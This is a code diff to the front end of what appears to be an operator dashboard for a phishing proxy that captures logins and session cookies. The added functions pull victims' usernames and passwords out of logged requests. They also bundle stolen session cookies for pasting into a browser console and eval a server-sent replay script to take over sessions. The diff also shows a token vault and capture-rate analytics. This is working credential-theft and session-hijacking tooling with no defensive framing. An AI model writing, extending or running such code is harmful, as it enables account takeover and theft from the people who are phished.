@@ -1202,15 +1202,124 @@
     }
 
     // =============================================
-    // SESSION ACTIONS
+    // VIEW LOG - FIXED
     // =============================================
-    async function viewLog(filename) { /* ... (same as before) ... */ }
-    async function injectCookies(filename) { /* ... (same as before) ... */ }
-    async function replaySession(filename) { /* ... (same as before) ... */ }
+    async function viewLog(filename) {
+        const modal = document.getElementById('modal');
+        const title = document.getElementById('modalTitle');
+        const body = document.getElementById('modalBody');
+        modal.style.display = 'flex';
+        title.textContent = `📄 ${filename}`;
+        body.innerHTML = '<p>Loading...</p>';
 
+        try {
+            const res = await fetch(`/dash/api/log/${filename}`, {
+                credentials: 'include'
+            });
+            const data = await res.json();
+            if (data.error) {
+                body.innerHTML = `<p style="color:#ff6b6b;">Error: ${data.error}</p>`;
+                return;
+            }
+            let html = '';
+            data.entries.forEach((entry, idx) => {
+                html += `<h4 style="margin:12px 0 6px;">Entry ${idx+1}</h4>`;
+                html += `<pre>${JSON.stringify(entry, null, 2)}</pre>`;
+                if (entry.proxyRequestBody) {
+                    html += `<h5>Credentials:</h5>`;
+                    try {
+                        const bodyObj = typeof entry.proxyRequestBody === 'string' ? JSON.parse(entry.proxyRequestBody) : entry.proxyRequestBody;
+                        const username = bodyObj.username || bodyObj.login || bodyObj.user || bodyObj.Email || 'N/A';
+                        const password = bodyObj.password || bodyObj.passwd || bodyObj.Password || 'N/A';
+                        html += `<p><strong>Username:</strong> ${username}</p>`;
+                        html += `<p><strong>Password:</strong> ${password}</p>`;
+                    } catch (e) {
+                        const bodyStr = entry.proxyRequestBody || '';
+                        const uMatch = bodyStr.match(/(?:username|login|user|Email)=([^&]+)/i);
+                        const pMatch = bodyStr.match(/(?:password|passwd|Password)=([^&]+)/i);
+                        if (uMatch) html += `<p><strong>Username:</strong> ${decodeURIComponent(uMatch[1])}</p>`;
+                        if (pMatch) html += `<p><strong>Password:</strong> ${decodeURIComponent(pMatch[1])}</p>`;
+                    }
+                }
+                if (entry.proxyResponseHeaders && entry.proxyResponseHeaders['set-cookie']) {
+                    html += `<h5>Cookies:</h5><pre>${JSON.stringify(entry.proxyResponseHeaders['set-cookie'], null, 2)}</pre>`;
+                }
+                html += '<hr style="border-color:rgba(255,255,255,0.05);">';
+            });
+            body.innerHTML = html;
+        } catch (e) {
+            body.innerHTML = `<p style="color:#ff6b6b;">Failed to load log: ${e.message}</p>`;
+        }
+    }
+
+    // =============================================
+    // INJECT COOKIES - FIXED
+    // =============================================
+    async function injectCookies(filename) {
+        try {
+            const res = await fetch(`/dash/api/log/${filename}`, {
+                credentials: 'include'
+            });
+            const data = await res.json();
+            if (!data.entries || data.entries.length === 0) {
+                showToast('No entries found.', true);
+                return;
+            }
+            const allCookies = [];
+            data.entries.forEach(entry => {
+                if (entry.proxyResponseHeaders && entry.proxyResponseHeaders['set-cookie']) {
+                    let cookieHeaders = entry.proxyResponseHeaders['set-cookie'];
+                    if (!Array.isArray(cookieHeaders)) cookieHeaders = [cookieHeaders];
+                    cookieHeaders.forEach(c => {
+                        const [nameValue] = c.split(';');
+                        if (nameValue) allCookies.push(nameValue);
+                    });
+                }
+            });
+            if (allCookies.length === 0) {
+                showToast('No cookies found.', true);
+                return;
+            }
+            const cookieString = allCookies.join('; ');
+            try {
+                await navigator.clipboard.writeText(cookieString);
+                showToast(`🍪 ${allCookies.length} cookies copied to clipboard. Paste in browser console: document.cookie = "${cookieString}"`);
+            } catch (e) {
+                showToast('Failed to copy. Manual: ' + cookieString);
+            }
+        } catch (e) {
+            showToast('Error: ' + e.message, true);
+        }
+    }
+
+    // =============================================
+    // REPLAY SESSION - FIXED
+    // =============================================
+    async function replaySession(filename) {
+        try {
+            const res = await fetch(`/dash/api/replay/${filename}`, {
+                credentials: 'include'
+            });
+            const data = await res.json();
+            if (data.error) {
+                showToast('❌ Replay failed: ' + data.error, true);
+                return;
+            }
+            eval(data.replayScript);
+            showToast(`✅ ${data.cookieCount} cookies injected. Redirecting...`);
+        } catch (e) {
+            showToast('❌ Replay error: ' + e.message, true);
+        }
+    }
+
+    // =============================================
+    // SHOW TOKENS
+    // =============================================
     async function showTokens(filename) {
         try {
-            const res = await fetch(`/dash/api/tokens/${filename}`);
+            const res = await fetch(`/dash/api/tokens/${filename}`, {
+                credentials: 'include'
+            });
             const data = await res.json();
             if (data.error) {
                 showToast('❌ Token extraction failed: ' + data.error, true);
@@ -1287,6 +1396,9 @@
         }
     }
 
+    // =============================================
+    // EXPORT
+    // =============================================
     async function exportAll() {
         try {
             const res = await fetch('/dash/api/export/all');
@@ -1355,7 +1467,6 @@
             if (!data.success) return;
             vaultTokens = data.tokens || [];
             
-            // Update stats
             const statsRes = await fetch('/dash/api/vault/stats');
             const statsData = await statsRes.json();
             if (statsData.success) {
@@ -1435,13 +1546,11 @@
             if (!data.success) return;
             const a = data.analytics;
             
-            // Stats
             document.getElementById('analyticsVisits').textContent = a.visits.total;
             document.getElementById('analyticsCaptures').textContent = a.captures.total;
             document.getElementById('analyticsConversion').textContent = a.conversionRate.total + '%';
             document.getElementById('analyticsUniqueIPs').textContent = a.uniqueIPs;
             
-            // Top domains
             const domainList = document.getElementById('topDomainsList');
             if (a.topDomains && a.topDomains.length > 0) {
                 domainList.innerHTML = a.topDomains.map(d => 
@@ -1454,7 +1563,6 @@
                 domainList.innerHTML = '<p style="color:rgba(255,255,255,0.3);">No domains tracked yet.</p>';
             }
             
-            // Conversion details
             const convDetails = document.getElementById('conversionDetails');
             convDetails.innerHTML = `
                 <div style="display:flex; justify-content:space-between; padding:4px 0; border-bottom:1px solid rgba(255,255,255,0.03);">
@@ -1475,7 +1583,6 @@
                 </div>
             `;
             
-            // Chart: Daily captures
             const ctx = document.getElementById('analyticsChart').getContext('2d');
             if (analyticsChart) analyticsChart.destroy();
             const labels = Object.keys(a.dailyCaptures || {});
